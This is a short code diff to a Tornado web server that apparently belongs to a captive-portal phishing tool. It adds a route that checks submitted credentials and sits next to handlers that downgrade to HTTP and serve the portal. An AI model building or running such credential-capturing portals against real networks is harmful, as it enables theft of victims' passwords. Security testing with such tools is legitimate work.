@@ -20,6 +20,24 @@ class DowngradeToHTTP(tornado.web.RequestHandler):
         self.redirect("http://10.0.0.1:8080/")
 
 
+class ValidateHandler(tornado.web.RequestHandler):
+
+    def initialize(self, em):
+        self.em = em
+
+    def get(self, cred_type, cred_content):
+        """
+        Override the get method
+
+        :param self: A tornado.web.RequestHandler object
+        :type self: tornado.web.RequestHandler
+        :return: None
+        :rtype: None
+        """
+        value = self.em.verify_cred((cred_type, cred_content))
+        self.write("%s" % value)
+
+
 class CaptivePortalHandler(tornado.web.RequestHandler):
 
     def get(self):
@@ -78,11 +96,12 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
             terminate = True
 
 
-def runHTTPServer(ip, port, ssl_port, t):
+def runHTTPServer(ip, port, ssl_port, t, em):
     global template
     template = t
     app = tornado.web.Application(
         [
+            (r"/validate/([^/]+)/([^/]+)", ValidateHandler, {"em": em}),
             (r"/.*", CaptivePortalHandler)
         ],
         template_path=template.get_path(),
